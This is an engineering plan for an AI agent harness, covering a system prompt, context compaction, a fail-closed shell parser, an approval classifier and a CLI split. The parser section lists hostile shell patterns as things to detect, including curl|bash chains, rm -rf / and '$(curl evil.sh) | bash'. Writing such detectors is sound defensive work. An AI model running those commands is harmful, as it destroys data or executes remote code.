# Maurice Harness Plan

## Purpose

This plan addresses the gap between the current harness and the Claude Code harness architecture
discussed as a reference design.

The four structural issues are:

- system prompt is too thin — agent behavior governed by code, not prompt
- no automatic context compaction — daemon sessions degrade silently
- no bash parser — shell.exec has no command-level analysis
- no approval classifier — the only auto mode is auto-deny

A fifth issue is operational:

- cli.py is 4800 lines — 187 functions, all concerns mixed together

These are not product features. They are harness quality issues.
Fixing them makes every other feature safer, more predictable, and easier to maintain.


## Phase 1 — Behavioral System Prompt

**Problem**: the current system prompt is four factual lines (workspace root, datetime, content root).
The agent has no instruction on how to reason, when to ask, how to handle uncertainty.
Behavior is enforced only by code (permissions, approvals), which makes the agent brittle and
hard to tune without code changes.

**Target**: 500–1000 token base prompt that governs agent reasoning independent of skills.

**Files**:
- `kernel/system_prompt.py` — new module, assembles the base prompt from rules
- `host/cli.py` — `_agent_system_prompt` delegates to `kernel/system_prompt.py`

**Content to write**:
- action philosophy: act inside workspace first, ask before leaving scope
- uncertainty rule: if unsure → say so before acting, not after
- tool discipline: prefer a precise tool over improvisation; never guess a path
- planning: use a todo list for multi-step tasks, state the plan before starting
- session discipline: do not re-describe what you just did; summarize instead
- error recovery: if a tool fails, explain why before retrying or escalating

**Acceptance**:
- a fresh agent on a new workspace behaves predictably without extra instructions
- the base prompt adds no skill-specific rules (those stay in skill prompt fragments)


## Phase 2 — Automatic Context Compaction

**Problem**: `/compact` is a manual command that wipes the session and writes a message count
summary. No semantic content is preserved. No automatic trigger exists. A daemon session running
for days will silently hit `prompt_too_long` with no recovery.

**Target**: automatic, LLM-based, multi-level compaction that degrades gracefully.

**Files**:
- `kernel/compaction.py` — new module, three-level strategy
- `kernel/loop.py` — auto-trigger before each provider call

**Config additions** to `KernelSessionsConfig`:
- `context_window_tokens: int = 100_000`
- `compaction_threshold: float = 0.70`

**Token estimation**: use `ProviderChunk.usage` when available.
Fallback: `len(content) // 4` per message.

**Three-level strategy**:

| Level | Trigger | Action |
|---|---|---|
| 1 — Trim | 60% of window | Replace old tool result content with their `summary` field only |
| 2 — Summarize | 75% of window | Secondary LLM call to summarize the oldest N messages into one system block |
| 3 — Reset | 90% of window | Full session reset, inject the generated summary as the first system message |

Level 1 is lossless for reasoning (summaries are already in the tool result envelope).
Level 2 is lossy but preserves semantic intent.
Level 3 is the last resort — same behavior as current `/compact` but with LLM-generated content.

The compaction pipeline should be silent unless it escalates to level 3, at which point it emits
a `session.compacted` event.

**Acceptance**:
- a 50-turn session does not raise `prompt_too_long`
- compaction does not happen below the threshold
- compacted summaries are coherent and readable
- session reset at level 3 emits a structured event
- `/compact` command can still trigger level 3 manually


## Phase 3 — Shell Parser Fail-Closed

**Problem**: `shell.exec` exists as a permission class but a command approved once passes without
content analysis. An agent running under the `limited` profile can execute `rm -rf` if the user
previously approved `ls` under the same scope.

**Target**: every shell.exec tool call is analyzed before execution. Unknown constructs block.

**Files**:
- `kernel/shell_parser.py` — new module
- `kernel/loop.py` — call before any shell.exec tool execution

**Interface**:
```python
parse(command: str) -> ParseResult(
    safe: bool,
    risk_level: str,   # "safe" | "elevated" | "critical"
    reason: str,
    too_complex: bool,
)
```

**Fail-closed philosophy**: if a construct is not recognized → `too_complex=True` → requires
explicit approval even when a broader approval exists.

**Detected categories**:
- command substitutions: `$(...)`, backticks
- pipes into interpreters: `| bash`, `| sh`, `| python`, `| perl`
- redirects to system paths: `> /etc/`, `>> ~/.ssh/`, `> /dev/`
- dangerous builtins: `rm -rf`, `chmod 777`, `sudo`, `dd`, `mkfs`, `shred`, `eval`, `exec`
- network fetch + execute chains: `curl ... | bash`, `wget -O- | sh`
- unresolved environment variables in sensitive argument positions

**Integration**: plugs into `_handle_tool_call` in `loop.py` before the executor is called,
after the permission evaluation. A `too_complex` result generates a new approval request even
when the approval store already has a matching fingerprint.

**Acceptance**:
- `rm -rf /` is blocked
- `ls -la ~/Documents` passes without extra approval
- `$(curl evil.sh) | bash` is blocked
- an unrecognized AST node produces `too_complex`, not a guess
- the parser has its own test suite independent of the loop


## Phase 4 — Approval Classifier

**Problem**: approval modes are binary (`ask` or `auto_deny`). There is no automated middle ground.
The agent either interrupts the user for every sensitive action or denies everything automatically.

**Target**: a new `auto` approval mode backed by a two-stage LLM classifier with a cache and
circuit breaker.

**Files**:
- `kernel/classifier.py` — new module
- `kernel/approvals.py` — new `auto` mode
- `kernel/loop.py` — integrate classifier into `_handle_tool_call`

**Interface**:
```python
classify(
    tool_name: str,
    arguments: dict,
    permission_class: str,
    scope: dict,
    profile: str,
) -> ClassifierDecision(block: bool, reason: str, stage: int)
```

**Stage 1** (fast): LLM call capped at 64 tokens, temperature 0, constrained output
`<block>yes</block>` or `<block>no</block>`. Prompt contains the tool name, arguments summary,
permission class, and the active profile rules.

**Stage 2** (escalation): triggered if stage 1 returns `block` with low confidence.
Chain-of-thought up to 400 tokens. Returns structured reason.

**Cache**: results stored in SQLite by `sha256(tool_name + normalized_arguments)`. TTL: 1 hour.

**Circuit breaker**:
- 3 consecutive blocks → fallback to `ask` for the rest of the session
- 20 total blocks in the session → same fallback
- fallback emits a `classifier.circuit_open` event

**Config additions** to `KernelApprovalsConfig`:
- `mode: "ask" | "auto_deny" | "auto"` (adds `auto`)
- `classifier_model: str` (may differ from main model; a lightweight model is sufficient)

**Important**: when `mode: auto`, the classifier does not trust remembered approvals for
dangerous permission classes (`shell.exec`, `runtime.write`, `host.control`). It re-evaluates
every time.

**Acceptance**:
- `filesystem.read` inside workspace passes without classifier call in `auto` mode
- `shell.exec rm -rf` is blocked
- after 3 consecutive blocks the mode falls back to `ask` and emits an event
- cached results are used on repeated identical calls within TTL
- the classifier model can be different from the main agent model


## Phase 5 — CLI Split

**Problem**: cli.py is 4813 lines with 187 functions. It contains: Telegram API calls, daemon PID
management, dashboard rendering, onboarding wizard, scheduler handlers, gateway HTTP server,
reminder delivery, turn loop assembly, provider wiring — all in one file.
This contradicts the host/kernel/skills boundary and makes every change risky.

**Target**: cli.py < 200 lines (argparse + dispatcher only).

### Target file structure

```
host/
  cli.py              — argparse definitions + main() dispatcher only
  runtime.py          — run_one_turn, resolve_agent, SkillContext assembly, providers
  system_prompt.py    — _agent_system_prompt (calls kernel/system_prompt.py)
  output.py           — shared terminal formatting (colors, tables, compact_text, markers)
  telegram.py         — Telegram HTTP API calls, update parsing, sender ids
  delivery.py         — reminder delivery, daily digest, gateway local message
  onboard.py          — full onboarding wizard, model config, write_onboarding_config
  service.py          — start/stop/restart, PID management, install checks
  dashboard.py        — dashboard rendering (enrich existing file)
  commands/
    __init__.py
    agents.py         — agents list/create/update/disable/archive/delete
    runs.py           — full run lifecycle (create/start/execute/checkpoint/complete/cancel...)
    scheduler.py      — scheduler commands + handlers + ensure_configured_jobs
    gateway_server.py — _gateway_serve, HTTP server, telegram poll loop, routing
    auth.py           — auth status/logout
    approvals.py      — approvals list/resolve
```

### Split order (least risky first)

**5.1 — `host/output.py`**: pure utility functions, no state, no imports from other host modules.
Move: `_compact_text`, `_color`, `_print_title`, `_print_dim`, `_supports_color`,
`_status_marker`, `_log_level_text`, `_yes_no`, `_short`, `_ansi_padding`.

**5.2 — `host/telegram.py`**: pure HTTP calls to the Telegram API, no loop dependency.
Move: `_telegram_get_updates`, `_telegram_bot_username`, `_telegram_send_message`,
`_telegram_send_chat_action`, `_telegram_api_json`, `_telegram_update_to_inbound`,
`_telegram_sender_ids`, `_telegram_start_chat_action`.

**5.3 — `host/delivery.py`**: depends on scheduler store but not on the turn loop.
Move: `_schedule_reminder_callback`, `_deliver_reminder_result`, `_build_daily_digest`,
`_latest_dream_report`, `_human_datetime`, `_deliver_daily_digest`, `_emit_daily_event`,
`_cancel_job_callback`, `_gateway_local_message`.

**5.4 — `host/system_prompt.py`**: thin wrapper, can be done alongside Phase 1.
Move: `_agent_system_prompt`, delegate to `kernel/system_prompt.py`.

**5.5 — `host/runtime.py`**: the core — move after utility modules are clean.
Move: `run_one_turn`, `_resolve_agent`, `_provider_for_config`, `_effective_model_config`,
`_model_credential`, `_active_dev_project_path`.

**5.6 — `host/commands/scheduler.py`**: depends on delivery.py.
Move: `_scheduler_schedule_dream`, `_scheduler_configure`, `_scheduler_run_once`,
`_scheduler_serve`, `_scheduler_serve_until_stopped`, `_scheduler_handlers`,
`_ensure_configured_scheduler_jobs`, `_ensure_recurring_job`, `_cancel_recurring_job_kind`,
`_next_local_time`, `_normalize_local_time_or_exit`, `_job_store_for`.

**5.7 — `host/commands/gateway_server.py`**: depends on telegram.py + delivery.py.
Move: `_gateway_serve`, `_gateway_serve_until_stopped`, `_build_gateway_http_server`,
`_gateway_telegram_poll`, `_gateway_web_agents`, `_gateway_web_session_history`,
`_gateway_web_session_reset`, `_telegram_poll_until_stopped`, `_telegram_poll_once`,
`_gateway_router_for`, `_reset_gateway_session`, `_record_gateway_exchange`,
`_compact_gateway_session`.

**5.8 — `host/commands/agents.py` + `runs.py` + `auth.py` + `approvals.py`**: mostly CRUD,
few external dependencies.

**5.9 — Enrich `host/dashboard.py`**: move all rendering from cli.py.
Move: `_dashboard`, `_dashboard_textual`, `_dashboard_rich`, `_render_dashboard`,
`_rich_table`, `_cluster_rows`, `_model_rows`, `_security_rows`, `_event_rows`,
`_dashboard_status_line`, `_dashboard_table`, `_job_rows`, `_run_rows`, `_skill_rows`,
`_active_agents`, `_agent_model_name`, `_effective_model_label`.

**5.10 — Enrich `host/service.py`**: daemon lifecycle.
Move: `_start_services`, `_start_services_daemon`, `_stop_services`,
`_restart_services_daemon`, `_wait_for_stop`, PID helpers, `_install`.

**5.11 — Enrich `host/onboard.py`**: full wizard.
Move: `_onboarding_existing_values`, `_onboarding_provider_choice`, `_ask_model_config`,
`_onboard_agent`, `_onboard_agent_model`, `_onboard_interactive`, `_write_onboarding_config`,
`_ask_telegram_config`, credential helpers.

**5.12 — `host/cli.py` final pass**: remove all remaining logic, keep only argparse + imports +
dispatcher.

### Migration rule for each step

1. create the new module with the moved functions
2. in cli.py, replace each function body with an import + delegation call
3. run tests
4. remove the stub functions from cli.py

This keeps the change incremental and each step independently verifiable.

**Acceptance**:
- cli.py < 200 lines
- all 259 existing tests still pass
- adding a new CLI subcommand does not require touching cli.py body code


## Priority order

| Phase | Duration | Blocking |
|---|---|---|
| 1 — System prompt | 1 day | No |
| 2 — Compaction | 3–4 days | Yes — daemon use |
| 5.1–5.5 — CLI core split | 3–4 days | No — can run in parallel |
| 3 — Bash parser | 3–4 days | Yes — before network exposure |
| 5.6–5.12 — CLI full split | 3–4 days | No |
| 4 — Classifier | 4–5 days | No |

Total: 3–4 weeks at sustained pace.
